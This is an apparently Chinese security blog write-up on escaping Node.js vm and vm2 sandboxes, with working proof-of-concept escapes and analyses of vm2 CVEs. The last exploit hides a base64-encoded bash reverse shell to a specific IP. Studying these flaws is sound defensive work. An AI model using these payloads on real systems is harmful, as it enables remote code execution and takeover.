</ul>
<h3 id="VM沙箱逃逸"><a href="#VM沙箱逃逸" class="headerlink" title="VM沙箱逃逸"></a>VM沙箱逃逸</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Before Escape\n&#x27;</span>)</span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Over Escape\n Never Execute!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>在第三行处 vm虚拟机环境中的代码逃逸 获得了主线程的Process变量 并调用process.exit() 造成主程序非正常退出</p>
<p><img src="/posts/bfeb5984/4.png" alt="img"></p>
<p>以上代码主要使用了<code>runInNewContext</code> 函数(相当于createContext和runInThisContext) </p>
<p>其等价于如下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Before Escape\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个沙箱对象</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Over Escape\n Never Execute!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/5.png" alt="img"></p>
<h3 id="VM下沙箱逃逸的利用方式"><a href="#VM下沙箱逃逸的利用方式" class="headerlink" title="VM下沙箱逃逸的利用方式"></a>VM下沙箱逃逸的利用方式</h3><p>一般沙箱逃逸后都会去尝试rce，而在Node中进行RCE就需要process  </p>
<p>在获取到process对象之后 可以通过require导入child_process，然后在利用child_process执行命令。</p>
<p>由于process挂载在global上，而通过API CreateContext创建的沙箱对象在golbal外，无法访问到global，所以想要实现rce就需要想办法将global中的Process引入到沙箱中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/6.png" alt="img"></p>
<p>在上述代码中 主要通过 <code>vm.runInNewContext</code>实现逃逸来返回进程上下文环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.runInNewContext(`this.constructor.constructor(&#x27;return process.env&#x27;)()`)</span><br></pre></td></tr></table></figure>

<p>this指向的是当前传递给  <code>runInNewContext</code>的对象，这个对象不属于沙箱环境中，</p>
<p>我们通过获取这个对象获取其构造器「<code>this.constructor</code>」，再获得一个构造器对象的构造器「<code>this.constructor.constructor</code>」 ， 最后调用这个函数的构造器生成的函数，返回值为一个Process对象。</p>
<h4 id="利用toString触发"><a href="#利用toString触发" class="headerlink" title="利用toString触发"></a>利用toString触发</h4><h5 id="利用this-constructor-constructor"><a href="#利用this-constructor-constructor" class="headerlink" title="利用this.constructor.constructor"></a>利用this.constructor.constructor</h5><p>一般进行沙箱逃逸后会进行rce  在node中进行rce需要process对象，获取到process对象后，可以通过require导入child_process  在利用child_process 执行命令</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.toString.constructor(&#x27;return process&#x27;)()`</span>);</span><br><span class="line"><span class="keyword">const</span> res = y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure>

<p>然后通过返回的Process对象来RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.runInNewContext(`this.constructor.constructor(&#x27;return process.env&#x27;)()`).mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br></pre></td></tr></table></figure>

<p><a href="https://nodejs.cn/api-v16/child_process.html#child_processexecsynccommand-options">https://nodejs.cn/api-v16/child_process.html#child_processexecsynccommand-options</a></p>
<p><img src="/posts/bfeb5984/7.png" alt="img"></p>
<h4 id="利用arguments-callee-caller"><a href="#利用arguments-callee-caller" class="headerlink" title="利用arguments.callee.caller"></a>利用arguments.callee.caller</h4><p>将上下文对象的原型链设置为nulll，并且没有其他可引用对象时，可以使用一个函数中内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者.</p>
<h5 id="arguments"><a href="#arguments" class="headerlink" title="arguments"></a>arguments</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//arguments是一个Object对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="comment">// [Arguments] &#123;&#125;</span></span><br><span class="line"><span class="comment">// [Arguments] &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//caller.caller为arguments对象的一个成员，它的值为正被执行的Function对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ac</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">ac</span>())</span><br><span class="line"><span class="comment">// [Function: ac]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//arguments.callee.caller调用当前函数的外层函数，如果是单函数无嵌套的话就是null/anonymous</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc</span>())</span><br><span class="line"><span class="comment">// [Function (anonymous)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tset</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">tset</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc2</span>())</span><br><span class="line"><span class="comment">// [Function: acc2]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">test2</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">test3</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">test2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc3</span>())</span><br><span class="line"><span class="comment">// [Function: test2]</span></span><br></pre></td></tr></table></figure>

<h5 id="利用arguments-callee-caller绕过"><a href="#利用arguments-callee-caller绕过" class="headerlink" title="利用arguments.callee.caller绕过"></a>利用arguments.callee.caller绕过</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;	</span><br><span class="line"><span class="comment">//context = Object.create(null);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function()&#123;</span></span><br><span class="line"><span class="string">        const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">        const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">        return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a </span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="keyword">const</span> context =<span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox); <span class="comment">//上下文隔离对象</span></span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script,context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]whoami: &#x27;</span>+ res)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/8.png" alt="img"></p>
<h4 id="利用Proxy代理绕过"><a href="#利用Proxy代理绕过" class="headerlink" title="利用Proxy代理绕过"></a>利用Proxy代理绕过</h4><p>如果沙箱外没有执行字符串相关操作来触发toString，且也无法利用恶意重写的函数时，可以使用proxy来劫持属性</p>
<h5 id="通过get钩子获取对象属性RCE的利用代码"><a href="#通过get钩子获取对象属性RCE的利用代码" class="headerlink" title="通过get钩子获取对象属性RCE的利用代码"></a>通过get钩子获取对象属性RCE的利用代码</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//const sandbox = &#123;&#125;</span></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">    ()=&gt;&#123;</span></span><br><span class="line"><span class="string">        const proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">            get : function()&#123;</span></span><br><span class="line"><span class="string">                const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">                const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">                return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        return proxy</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]whoami:&quot;</span> + res)</span><br></pre></td></tr></table></figure>

<p>没有输出 </p>
<p><img src="/posts/bfeb5984/9.png" alt="img"></p>
<p>调试后发现 这里 res作为输出 如果是选择res输出的话 会输出res的值 而输出一个res不存在的方法时 就会触发RCE  …..  但是在后面调试的时候 之前没有报错会返回whoami的结果  后面又触发了异常，在异常中输出了whoami的结果test (好像是whoami命令时候有点异常 换做ls命令还算正常触发了rce)   </p>
<p>下图是调试状态下载调试控制台输出的结果 </p>
<p><img src="/posts/bfeb5984/10.png" alt="img"></p>
<p>如果直接运行会触发异常 在异常中会输出结果 这是whomai的结果  有时候不会触发异常 不会输出结果</p>
<p><img src="/posts/bfeb5984/11.png" alt="img"></p>
<p>但是换成ls命令后 便可正常rce   😓@_@</p>
<p><img src="/posts/bfeb5984/12.png" alt="img"></p>
<h5 id="利用异常抛出沙箱内对象"><a href="#利用异常抛出沙箱内对象" class="headerlink" title="利用异常抛出沙箱内对象"></a>利用异常抛出沙箱内对象</h5><p>通过异常 将沙箱内的对象抛出并在外部输出</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(sandbox));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/13.png" alt="img"></p>
<h3 id="VM2沙箱"><a href="#VM2沙箱" class="headerlink" title="VM2沙箱"></a>VM2沙箱</h3><p>vm2 是在vm基础上实现的沙箱   内部调用的还是vm的API，使用JavaScript的Proxy技术来防止沙箱逃逸</p>
<p>(Proxy 可参考：<a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a>)</p>
<h4 id="VM2结构"><a href="#VM2结构" class="headerlink" title="VM2结构"></a>VM2结构</h4><p><a href="mailto:&#x76;&#x6d;&#x32;&#x40;&#51;&#46;&#x39;&#x2e;&#49;&#52;">&#x76;&#x6d;&#x32;&#x40;&#51;&#46;&#x39;&#x2e;&#49;&#52;</a>下结构如下</p>
<p><img src="/posts/bfeb5984/14.png" alt="img"></p>
<p><a href="mailto:&#x76;&#109;&#x32;&#x40;&#51;&#x2e;&#x36;&#x2e;&#49;&#48;">&#x76;&#109;&#x32;&#x40;&#51;&#x2e;&#x36;&#x2e;&#49;&#48;</a>下结构如下</p>
<p><img src="/posts/bfeb5984/15.png" alt="img"></p>
<p>相比新版本下，该版本的结构要简单多 便于去理解其原理</p>
<p>主要包括4个js文件  <code>cli.js</code> <code>contextify.js</code> <code>main.js</code> <code>sandbox.js</code></p>
<p>其中 cli.js 主要是命令行的调用</p>
<p><img src="/posts/bfeb5984/16.png" alt="img"></p>
<p><img src="/posts/bfeb5984/17.png" alt="img"></p>
<p>contextify.js 封装了三个对象：Decontextify、Contextify   并针对 global的Buffer类进行的代理</p>
<p><img src="/posts/bfeb5984/18.png" alt="img"></p>
<p>sandbox.js  对global的一些函数和变量进行了hook，比如setTimeout、setInterval、setImmediate等</p>
<p><img src="/posts/bfeb5984/19.png" alt="img"></p>
<p>main.js 执行入口点 导出NodeVM、VM这两个沙箱环境和VMScript(封装了vm.Script)</p>
<p><img src="/posts/bfeb5984/20.png" alt="img"></p>
<h4 id="VM2运行原理"><a href="#VM2运行原理" class="headerlink" title="VM2运行原理"></a>VM2运行原理</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(<span class="string">&quot;let a = 2;a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/21.png" alt="img"></p>
<p>图片源自<a href="https://www.anquanke.com/post/id/207283#h2-1">https://www.anquanke.com/post/id/207283#h2-1</a></p>
<p>当创建一个VM对象后，vm2内部引入contextify.js 并对context上下文进行封装，最后再调用<code>script.runInContext(context)</code>。从图便可看出vm2核心操作在于针对于对context的封装上。</p>
<p>原理分析 调试 可参考 </p>
<p><a href="https://www.anquanke.com/post/id/207283#h2-3">https://www.anquanke.com/post/id/207283#h2-3</a></p>
<p><a href="https://blog.csdn.net/anwen12/article/details/120445707">https://blog.csdn.net/anwen12/article/details/120445707</a></p>
<p><a href="https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html#reference">https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html#reference</a></p>
<p>runInContext -&gt; Decontextify.value</p>
<p><img src="/posts/bfeb5984/22.png" alt="img"></p>
<h3 id="VM2下沙箱逃逸漏洞分析"><a href="#VM2下沙箱逃逸漏洞分析" class="headerlink" title="VM2下沙箱逃逸漏洞分析"></a>VM2下沙箱逃逸漏洞分析</h3><h4 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h4><p>参考 </p>
<p><a href="https://github.com/patriksimek/vm2/issues/197">https://github.com/patriksimek/vm2/issues/197</a></p>
<p><a href="https://github.com/advisories/GHSA-wf5x-cr3r-xr77">https://github.com/advisories/GHSA-wf5x-cr3r-xr77</a></p>
<p><a href="https://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a">https://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a</a></p>
<p>vm2 &lt; 3.6.11</p>
<p><a href="https://github.com/advisories/GHSA-wf5x-cr3r-xr77">https://github.com/advisories/GHSA-wf5x-cr3r-xr77</a></p>
<p>安装 npm i <a href="mailto:&#x76;&#109;&#50;&#64;&#x33;&#46;&#54;&#46;&#49;&#48;">&#x76;&#109;&#50;&#64;&#x33;&#46;&#54;&#46;&#49;&#48;</a></p>
<p>下载完后会在桌面下生成一恶搞node_modules 里面有安装的vm2 …. 之前没注意 因为前面安装时候是在.nvm下默认安装的</p>
<p><img src="/posts/bfeb5984/23.png" alt="img"></p>
<p><img src="/posts/bfeb5984/24.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">const f = Buffer.prototype.write;</span></span><br><span class="line"><span class="string">const ft = &#123;</span></span><br><span class="line"><span class="string">		length: 10,</span></span><br><span class="line"><span class="string">		utf8Write()&#123;		&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function r(i)&#123;  </span></span><br><span class="line"><span class="string">	var x = 0;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		x = r(i);</span></span><br><span class="line"><span class="string">	&#125;catch(e)&#123;&#125;</span></span><br><span class="line"><span class="string">	if(typeof(x)!==&#x27;number&#x27;)</span></span><br><span class="line"><span class="string">		return x;</span></span><br><span class="line"><span class="string">	if(x!==i)</span></span><br><span class="line"><span class="string">		return x+1;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		f.call(ft);</span></span><br><span class="line"><span class="string">	&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">		return e;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	return null;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var i=1;</span></span><br><span class="line"><span class="string">while(1)&#123;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		i=r(i).constructor.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;catch(x)&#123;</span></span><br><span class="line"><span class="string">		i++;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">i.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/25.png" alt="img"></p>
<p>假设最大次数为 1000 当递归到最高次数是 </p>
<p>r(i) 递归函数</p>
<p>f.call(ft);  </p>
<p>ft:  this.utf8Write() </p>
<p>沙箱逃逸 从沙箱外获取一个对象，然后获取这个对象的constructor属性。</p>
<p>这个poc链通过 多次递归调用 当达到一定次数后(超过最大调用堆栈的大小)，当我们正在调用沙箱外的函数时，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象</p>
<h4 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h4><p>vm2 &lt; 3.9.4</p>
<p>参考以下p牛的说法:</p>
<p>在JavaScript中 import()是一个语法结构，并不是一个函数，无法通过像是使用require的方法来处理import</p>
<p>在调用import()的结果实际上并没有经过沙箱，是一个外部变量，可以直接获取constructor进而获取到process对象来实现命令执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;pwd&quot;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/26.png" alt="img"></p>
<h4 id="CVE-2022-36067"><a href="#CVE-2022-36067" class="headerlink" title="CVE-2022-36067"></a>CVE-2022-36067</h4><p>参考 <a href="https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067">https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067</a></p>
<p><a href="https://github.com/advisories/GHSA-mrgp-mrhc-5jrq">https://github.com/advisories/GHSA-mrgp-mrhc-5jrq</a></p>
<h4 id="CVE-2023-29017"><a href="#CVE-2023-29017" class="headerlink" title="CVE-2023-29017"></a>CVE-2023-29017</h4><p>在处理异步错误时 未正确处理<code> Error.prepareStackTrace的</code>宿主对象 从而实现沙箱绕过。当异常发生时，可以使用Error.prepareStackTrace自定义异常</p>
<p>在sandbox.js中 定义类</p>
<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>vm2 &lt;= 3.9.14</p>
<p>同时需要 Node.js 版本满足以下条件：</p>
<p>Node.js &gt; 16.14.0</p>
<p>Node.js &gt; 17.4.0</p>
<p>Node.js 18.x</p>
<p>Node.js 19.x</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node js"></a>安装node js</h6><p>安装 nvm</p>
<p>curl -o- <a href="https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh">https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh</a> | bash</p>
<p>查看nodejs可安装版本(重启一个终端)</p>
<p>nvm ls-remote</p>
<p>安装指定版本的nodejs</p>
<p>nvm install v17.5.0</p>
<p><img src="/posts/bfeb5984/27.png" alt="img"></p>
<h6 id="安装vm2"><a href="#安装vm2" class="headerlink" title="安装vm2"></a>安装vm2</h6><p>npm install <a href="mailto:&#118;&#109;&#x32;&#64;&#x33;&#x2e;&#x39;&#x2e;&#49;&#x34;">&#118;&#109;&#x32;&#64;&#x33;&#x2e;&#x39;&#x2e;&#49;&#x34;</a>        （npm install 安装指定版本时 后面@加版本号即可）</p>
<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>问题主要在于sst这个地方 没有考虑sst是否是沙箱处理过的对象，如果是一个宿主的对象，那么这个sst可以在<code>prepareStackTrcae</code>执行时作为参数使用</p>
<p><img src="/posts/bfeb5984/28.png" alt="img"></p>
<p>在漏洞<a href="https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50">修复</a>中 使用<code>ensureThis（）</code>函数对sst进行验证，确保该函数是经过Proxy处理的对象</p>
<p><img src="/posts/bfeb5984/29.png" alt="img"></p>
<p>分析文章可以参考 </p>
<p><a href="https://github.com/patriksimek/vm2/issues/515">https://github.com/patriksimek/vm2/issues/515</a></p>
<p><a href="https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg">https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg</a></p>
<p><a href="https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50">https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50</a></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p><a href="https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d">https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d</a></p>
<p>反弹shell</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> vmInstance = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">Error.prepareStackTrace = (e, frames) =&gt; &#123;</span></span><br><span class="line"><span class="string">    frames.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bash&#x27;); </span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">(async ()=&gt;&#123;&#125;).constructor(&#x27;return process&#x27;)()</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line">vmInstance.<span class="title function_">run</span>(code);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/30.png" alt="img"></p>
